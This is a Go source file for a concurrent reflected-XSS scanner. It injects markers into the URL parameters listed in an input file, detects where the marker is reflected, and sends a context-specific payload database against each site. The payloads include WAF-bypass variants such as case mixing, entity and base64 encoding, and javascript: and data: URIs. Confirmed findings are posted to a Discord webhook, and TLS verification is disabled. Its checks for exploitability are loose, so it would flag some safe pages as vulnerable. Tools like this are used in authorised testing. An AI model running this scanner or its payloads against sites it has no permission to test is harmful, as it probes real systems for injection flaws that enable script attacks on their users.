package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Config holds the scanner configuration
type Config struct {
	DiscordWebhook string
	Concurrency    int
	Timeout        int
}

// XSSContext represents where the reflection occurs
type XSSContext int

const (
	ContextUnknown XSSContext = iota
	ContextHTMLBody
	ContextHTMLAttribute
	ContextJavaScript
	ContextJavaScriptString
	ContextURLContext
	ContextHTMLComment
)

// Vulnerability represents a confirmed XSS vulnerability
type Vulnerability struct {
	URL             string
	Parameter       string
	Context         XSSContext
	Payload         string
	ReflectionPoint string
}

// Stats tracks scanning progress
type Stats struct {
	total     int64
	tested    int64
	reflected int64
	vulnerable int64
	startTime time.Time
	mu        sync.Mutex
}

var (
	stats         Stats
	seenVulns     sync.Map
	discordMu     sync.Mutex
	config        Config
)

// Payload database with context-aware payloads
var payloadDatabase = map[XSSContext][]string{
	ContextHTMLBody: {
		// Basic payloads
		`<script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg onload=alert(1)>`,

		// Event handler payloads
		`<body onload=alert(1)>`,
		`<input onfocus=alert(1) autofocus>`,
		`<select onfocus=alert(1) autofocus>`,
		`<textarea onfocus=alert(1) autofocus>`,
		`<keygen onfocus=alert(1) autofocus>`,
		`<video><source onerror="alert(1)">`,
		`<audio src=x onerror=alert(1)>`,

		// WAF bypass - case mixing
		`<ScRiPt>alert(1)</sCrIpT>`,
		`<IMG SRC=x OnErRoR=alert(1)>`,

		// WAF bypass - encoding
		`<img src=x onerror="alert(1)">`,
		`<img src=x onerror='alert(1)'>`,
		`<img src=x onerror=alert&#40;1&#41;>`,
		`<img src=x onerror=alert&#x28;1&#x29;>`,

		// WAF bypass - no quotes
		`<svg/onload=alert(1)>`,
		`<img/src=x/onerror=alert(1)>`,

		// WAF bypass - advanced
		`<iframe srcdoc="<script>alert(1)</script>">`,
		`<object data="javascript:alert(1)">`,
		`<embed src="javascript:alert(1)">`,
		`<marquee onstart=alert(1)>`,
		`<details open ontoggle=alert(1)>`,

		// Polyglot-style payloads
		`'"><script>alert(1)</script>`,
		`'"--></script><script>alert(1)</script>`,
		`</script><script>alert(1)</script>`,
	},

	ContextHTMLAttribute: {
		// Break out of attribute
		`" onload="alert(1)`,
		`' onload='alert(1)`,
		`" onfocus="alert(1)" autofocus="`,
		`' onfocus='alert(1)' autofocus='`,

		// Without quotes
		`onload=alert(1)`,
		`onfocus=alert(1) autofocus`,

		// Close tag and inject
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		`><img src=x onerror=alert(1)>`,

		// Event handlers
		`" onmouseover="alert(1)`,
		`' onmouseover='alert(1)`,
		`" onclick="alert(1)`,

		// WAF bypass
		`"OnClIcK="alert(1)`,
		`"/**/onload="alert(1)`,
		`"%20onload="alert(1)`,
		`"/onload="alert(1)`,
	},

	ContextJavaScriptString: {
		// Break out of string
		`";alert(1)//`,
		`';alert(1)//`,
		`";alert(1);"`,
		`';alert(1);'`,

		// Close script and reopen
		`</script><script>alert(1)</script><script>`,

		// Unicode escape
		`\u0022;alert(1)//`,
		`\x22;alert(1)//`,

		// Newline injection
		`\nalert(1)//`,
		`\ralert(1)//`,
		`</script><script>alert(1)</script>`,
	},

	ContextJavaScript: {
		// Direct injection
		`alert(1)`,
		`alert(1)//`,
		`alert(1);`,
		`(alert)(1)`,
		`[1].find(alert)`,
		`window['alert'](1)`,
		`self['alert'](1)`,
		`top['alert'](1)`,
		`parent['alert'](1)`,

		// WAF bypass
		`window['\x61\x6c\x65\x72\x74'](1)`,
		`eval('alert(1)')`,
		`eval(atob('YWxlcnQoMSk='))`,
		`Function('alert(1)')()`,
		`setTimeout('alert(1)')`,
		`setInterval('alert(1)')`,
	},

	ContextURLContext: {
		`javascript:alert(1)`,
		`javascript:alert(1)//`,
		`javascript:void(alert(1))`,
		`javascript:void(0);alert(1)`,
		`javascript:%61%6c%65%72%74(1)`,
		`javascript:alert&#40;1&#41;`,
		`data:text/html,<script>alert(1)</script>`,
		`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
	},
}

func main() {
	urlFile := flag.String("f", "", "File containing URLs to test (required)")
	concurrency := flag.Int("c", 50, "Number of concurrent requests")
	timeout := flag.Int("t", 10, "HTTP timeout in seconds")
	discordWebhook := flag.String("discord", "", "Discord webhook URL for notifications")
	flag.Parse()

	if *urlFile == "" {
		fmt.Println("Usage: xss-scanner -f <url-file> [-c concurrency] [-t timeout] [-discord webhook-url]")
		fmt.Println("\nExample:")
		fmt.Println("  xss-scanner -f urls.txt -c 50 -discord https://discord.com/api/webhooks/...")
		flag.PrintDefaults()
		os.Exit(1)
	}

	// Load config from config.sh if exists
	loadConfig()

	// Override with command line args
	config.Concurrency = *concurrency
	config.Timeout = *timeout
	if *discordWebhook != "" {
		config.DiscordWebhook = *discordWebhook
	}

	if config.DiscordWebhook != "" {
		fmt.Printf("[+] Discord notifications enabled\n")
	}

	// Read URLs from file
	urls, err := readURLs(*urlFile)
	if err != nil {
		fmt.Printf("[-] Error reading URLs: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[+] Loaded %d URLs\n", len(urls))

	// Filter URLs with parameters
	urlsWithParams := filterURLsWithParams(urls)
	fmt.Printf("[+] Found %d URLs with parameters\n", len(urlsWithParams))

	if len(urlsWithParams) == 0 {
		fmt.Println("[-] No URLs with parameters found. XSS testing requires parameters.")
		os.Exit(1)
	}

	stats.total = int64(len(urlsWithParams))
	stats.startTime = time.Now()

	// Start progress reporter
	go reportProgress()

	// Scan URLs
	scanURLs(urlsWithParams)

	// Final stats
	fmt.Printf("\n[+] Scan complete!\n")
	fmt.Printf("[+] Total URLs: %d\n", stats.total)
	fmt.Printf("[+] Tested: %d\n", atomic.LoadInt64(&stats.tested))
	fmt.Printf("[+] Reflected: %d\n", atomic.LoadInt64(&stats.reflected))
	fmt.Printf("[+] Vulnerable: %d\n", atomic.LoadInt64(&stats.vulnerable))
	fmt.Printf("[+] Time taken: %s\n", time.Since(stats.startTime).Round(time.Second))
}

func loadConfig() {
	// Try to load config from ../config.sh
	configFile := "../config.sh"
	data, err := os.ReadFile(configFile)
	if err != nil {
		return
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "DISCORD_WEBHOOK=") {
			webhook := strings.TrimPrefix(line, "DISCORD_WEBHOOK=")
			webhook = strings.Trim(webhook, "\"'")
			config.DiscordWebhook = webhook
		}
	}
}

func readURLs(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			// Ensure URL has protocol
			if !strings.HasPrefix(strings.ToLower(line), "http://") &&
			   !strings.HasPrefix(strings.ToLower(line), "https://") {
				line = "http://" + line
			}
			urls = append(urls, line)
		}
	}
	return urls, scanner.Err()
}

func filterURLsWithParams(urls []string) []string {
	var filtered []string
	for _, u := range urls {
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		// Only test URLs with query parameters
		if len(parsed.Query()) > 0 {
			filtered = append(filtered, u)
		}
	}
	return filtered
}

func scanURLs(urls []string) {
	semaphore := make(chan struct{}, config.Concurrency)
	var wg sync.WaitGroup

	for _, targetURL := range urls {
		wg.Add(1)
		semaphore <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-semaphore }()

			testURL(u)
			atomic.AddInt64(&stats.tested, 1)
		}(targetURL)
	}

	wg.Wait()
}

func testURL(targetURL string) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	params := parsed.Query()
	if len(params) == 0 {
		return
	}

	// Test each parameter
	for param := range params {
		testParameter(targetURL, param)
	}
}

func testParameter(targetURL, param string) {
	// Generate unique marker
	marker := generateMarker()

	// Inject marker
	testURLWithMarker := injectMarker(targetURL, param, marker)

	// Make request
	resp, body, err := makeRequest(testURLWithMarker)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Check if marker is reflected
	if !strings.Contains(body, marker) {
		return
	}

	atomic.AddInt64(&stats.reflected, 1)

	// Detect context
	context := detectContext(body, marker)

	// Test payloads for this context
	testPayloadsForContext(targetURL, param, context, marker)
}

func generateMarker() string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 12)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return "xss" + string(b)
}

func injectMarker(targetURL, param, marker string) string {
	parsed, _ := url.Parse(targetURL)
	q := parsed.Query()
	q.Set(param, marker)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func makeRequest(targetURL string) (*http.Response, string, error) {
	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			return nil
		},
	}

	resp, err := client.Get(targetURL)
	if err != nil {
		return nil, "", err
	}

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		resp.Body.Close()
		return nil, "", err
	}

	// Reset body for potential re-reading
	resp.Body = io.NopCloser(bytes.NewBuffer(bodyBytes))

	return resp, string(bodyBytes), nil
}

func detectContext(body, marker string) XSSContext {
	markerLower := strings.ToLower(marker)
	bodyLower := strings.ToLower(body)

	// Check if in HTML comment
	commentRegex := regexp.MustCompile(`<!--[^>]*` + regexp.QuoteMeta(markerLower) + `[^>]*-->`)
	if commentRegex.MatchString(bodyLower) {
		return ContextHTMLComment
	}

	// Check if in JavaScript context
	scriptRegex := regexp.MustCompile(`<script[^>]*>.*?` + regexp.QuoteMeta(markerLower) + `.*?</script>`)
	if scriptRegex.MatchString(bodyLower) {
		// Check if in string
		jsStringRegex := regexp.MustCompile(`["'\x60].*?` + regexp.QuoteMeta(markerLower) + `.*?["'\x60]`)
		if jsStringRegex.MatchString(body) {
			return ContextJavaScriptString
		}
		return ContextJavaScript
	}

	// Check if in HTML attribute
	attrRegex := regexp.MustCompile(`<[^>]+\s+\w+\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(markerLower) + `[^"'>]*["']?[^>]*>`)
	if attrRegex.MatchString(bodyLower) {
		return ContextHTMLAttribute
	}

	// Check if in URL context (href, src, action, etc.)
	urlAttrRegex := regexp.MustCompile(`<[^>]+\s+(href|src|action|data|formaction)\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(markerLower) + `[^"'>]*["']?[^>]*>`)
	if urlAttrRegex.MatchString(bodyLower) {
		return ContextURLContext
	}

	// Default to HTML body
	return ContextHTMLBody
}

func testPayloadsForContext(targetURL, param string, context XSSContext, originalMarker string) {
	// Skip HTML comments - not exploitable
	if context == ContextHTMLComment {
		return
	}

	payloads, ok := payloadDatabase[context]
	if !ok {
		// Fallback to HTML body payloads
		payloads = payloadDatabase[ContextHTMLBody]
	}

	// Test each payload
	for _, payload := range payloads {
		if testPayload(targetURL, param, payload, context) {
			atomic.AddInt64(&stats.vulnerable, 1)

			vuln := Vulnerability{
				URL:       targetURL,
				Parameter: param,
				Context:   context,
				Payload:   payload,
			}

			// Check if already reported
			key := vuln.URL + ":" + vuln.Parameter
			if _, exists := seenVulns.LoadOrStore(key, true); !exists {
				reportVulnerability(vuln)
			}

			// Found one working payload, no need to test more
			break
		}
	}
}

func testPayload(targetURL, param, payload string, context XSSContext) bool {
	// Inject payload
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return false
	}

	q := parsed.Query()
	q.Set(param, payload)
	parsed.RawQuery = q.Encode()
	testURL := parsed.String()

	// Make request
	_, body, err := makeRequest(testURL)
	if err != nil {
		return false
	}

	// Validate if payload is present AND in exploitable position
	return validateXSS(body, payload, context)
}

func validateXSS(body string, payload string, context XSSContext) bool {
	bodyLower := strings.ToLower(body)
	payloadLower := strings.ToLower(payload)

	// Check if payload is in response
	if !strings.Contains(bodyLower, payloadLower) && !containsPartialPayload(bodyLower, payloadLower) {
		return false
	}

	// Context-specific validation
	switch context {
	case ContextHTMLBody:
		// Check if script tag or event handler is present
		if strings.Contains(payloadLower, "<script") ||
		   strings.Contains(payloadLower, "onerror") ||
		   strings.Contains(payloadLower, "onload") ||
		   strings.Contains(payloadLower, "onfocus") ||
		   strings.Contains(payloadLower, "<svg") ||
		   strings.Contains(payloadLower, "<img") {
			// Make sure it's not HTML encoded
			if strings.Contains(body, "&lt;") || strings.Contains(body, "&#") {
				return false
			}
			return true
		}

	case ContextHTMLAttribute:
		// Check if we broke out of attribute or injected event handler
		if strings.Contains(payloadLower, `"`) ||
		   strings.Contains(payloadLower, `'`) ||
		   strings.Contains(payloadLower, "onload") ||
		   strings.Contains(payloadLower, "onfocus") ||
		   strings.Contains(payloadLower, "onclick") {
			return true
		}

	case ContextJavaScriptString:
		// Check if we broke out of string
		if strings.Contains(payloadLower, `";`) ||
		   strings.Contains(payloadLower, `';`) ||
		   strings.Contains(payloadLower, "</script>") {
			return true
		}

	case ContextJavaScript:
		// Direct JavaScript execution
		if strings.Contains(payloadLower, "alert") ||
		   strings.Contains(payloadLower, "eval") ||
		   strings.Contains(payloadLower, "function") {
			return true
		}

	case ContextURLContext:
		// Check for javascript: protocol
		if strings.Contains(payloadLower, "javascript:") ||
		   strings.Contains(payloadLower, "data:text/html") {
			return true
		}
	}

	return false
}

func containsPartialPayload(body, payload string) bool {
	// Check if payload components are present (for encoded payloads)
	keywords := []string{"alert", "script", "onerror", "onload", "svg", "img"}
	count := 0
	for _, keyword := range keywords {
		if strings.Contains(payload, keyword) && strings.Contains(body, keyword) {
			count++
		}
	}
	return count >= 2
}

func reportVulnerability(vuln Vulnerability) {
	contextName := getContextName(vuln.Context)

	fmt.Printf("\n[!] VULNERABLE: %s\n", vuln.URL)
	fmt.Printf("    Parameter: %s\n", vuln.Parameter)
	fmt.Printf("    Context: %s\n", contextName)
	fmt.Printf("    Payload: %s\n", vuln.Payload)

	if config.DiscordWebhook != "" {
		sendDiscordNotification(vuln)
	}
}

func getContextName(context XSSContext) string {
	switch context {
	case ContextHTMLBody:
		return "HTML Body"
	case ContextHTMLAttribute:
		return "HTML Attribute"
	case ContextJavaScript:
		return "JavaScript"
	case ContextJavaScriptString:
		return "JavaScript String"
	case ContextURLContext:
		return "URL Context"
	case ContextHTMLComment:
		return "HTML Comment"
	default:
		return "Unknown"
	}
}

func sendDiscordNotification(vuln Vulnerability) {
	discordMu.Lock()
	defer discordMu.Unlock()

	contextName := getContextName(vuln.Context)

	embed := map[string]interface{}{
		"title":       "🚨 XSS Vulnerability Found",
		"description": fmt.Sprintf("Reflected XSS detected in **%s**", vuln.Parameter),
		"color":       15158332, // Red color
		"fields": []map[string]interface{}{
			{
				"name":   "URL",
				"value":  fmt.Sprintf("```%s```", vuln.URL),
				"inline": false,
			},
			{
				"name":   "Parameter",
				"value":  fmt.Sprintf("`%s`", vuln.Parameter),
				"inline": true,
			},
			{
				"name":   "Context",
				"value":  contextName,
				"inline": true,
			},
			{
				"name":   "Payload",
				"value":  fmt.Sprintf("```%s```", vuln.Payload),
				"inline": false,
			},
		},
		"timestamp": time.Now().Format(time.RFC3339),
	}

	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{embed},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return
	}

	client := &http.Client{Timeout: 5 * time.Second}
	req, err := http.NewRequest("POST", config.DiscordWebhook, bytes.NewBuffer(jsonData))
	if err != nil {
		return
	}

	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Rate limiting
	time.Sleep(500 * time.Millisecond)
}

func reportProgress() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		tested := atomic.LoadInt64(&stats.tested)
		if tested == 0 {
			continue
		}

		elapsed := time.Since(stats.startTime).Seconds()
		rate := float64(tested) / elapsed
		remaining := stats.total - tested
		eta := time.Duration(float64(remaining)/rate) * time.Second

		percentage := float64(tested) / float64(stats.total) * 100

		fmt.Printf("\r[*] Progress: %d/%d (%.1f%%) | Rate: %.0f URLs/s | Reflected: %d | Vulnerable: %d | ETA: %s     ",
			tested, stats.total, percentage, rate,
			atomic.LoadInt64(&stats.reflected),
			atomic.LoadInt64(&stats.vulnerable),
			eta.Round(time.Second))

		if tested >= stats.total {
			break
		}
	}
}

func init() {
	rand.Seed(time.Now().UnixNano())
}
